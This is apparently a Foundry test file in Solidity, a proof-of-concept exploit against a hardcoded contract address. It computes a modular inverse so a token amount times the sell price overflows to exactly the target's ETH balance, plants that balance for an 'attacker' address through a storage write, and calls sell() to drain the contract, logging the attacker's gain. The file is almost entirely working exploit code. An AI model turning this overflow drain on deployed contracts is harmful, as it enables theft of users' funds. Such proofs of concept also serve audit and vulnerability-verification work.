// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Test, console2, stdStorage, StdStorage} from "forge-std/Test.sol";

contract OverflowPoC is Test {
    using stdStorage for StdStorage;
    address constant TARGET = address(uint160(0x00cffafced915d6cc3e9b05ef38b52f0bccd897e91));

    function _u(bytes memory sig) internal view returns (bool ok, uint256 v) {
        bytes memory d; (ok, d) = TARGET.staticcall(sig);
        if (ok && d.length >= 32) v = abi.decode(d, (uint256));
    }
    // modular inverse of an ODD a, mod 2**256 (Newton-Hensel: 5 correct bits doubled 6x -> 256).
    function _inv(uint256 a) internal pure returns (uint256 inv) {
        unchecked { inv = (3 * a) ^ 2;
            inv *= 2 - a * inv; inv *= 2 - a * inv; inv *= 2 - a * inv;
            inv *= 2 - a * inv; inv *= 2 - a * inv; inv *= 2 - a * inv; }
    }
    function test_overflow() public {
        address attacker = makeAddr("attacker");
        (bool okP, uint256 price) = _u(abi.encodeWithSignature("sellPrice()"));
        (, uint256 supply) = _u(abi.encodeWithSignature("totalSupply()"));
        uint256 contractEth = TARGET.balance;
        console2.log("OVF_PRICE", price);
        console2.log("OVF_SUPPLY", supply);
        console2.log("OVF_TGT_ETH_BEFORE", contractEth);
        if (!okP || price == 0 || price & 1 == 0 || contractEth == 0) {
            console2.log("OVF_SKIP", 1); return;   // need an odd, nonzero multiplier and a funded target
        }
        uint256 amount;
        unchecked { amount = contractEth * _inv(price); }   // amount*price wraps to EXACTLY contractEth
        console2.log("OVF_AMOUNT", amount);
        console2.log("OVF_AMOUNT_GT_SUPPLY", amount > supply);
        // TARGETED injection: give the attacker the exact token balance the math needs; checked_write
        // reverts if the balanceOf slot can't be resolved, so we never fabricate against the wrong slot.
        try this._inject(attacker, amount) {} catch { console2.log("OVF_INJECT_FAIL", 1); return; }
        uint256 attBefore = attacker.balance;
        vm.prank(attacker, attacker);
        (bool ok, ) = TARGET.call(abi.encodeWithSignature("sell(uint256)", amount));
        console2.log("OVF_CALL_OK", ok);
        console2.log("OVF_ATT_ETH_GAIN", int256(attacker.balance) - int256(attBefore));
        console2.log("OVF_TGT_ETH_DELTA", int256(TARGET.balance) - int256(contractEth));
    }
    function _inject(address who, uint256 amt) external {
        stdstore.target(TARGET).sig("balanceOf(address)").with_key(who).checked_write(amt);
    }
}
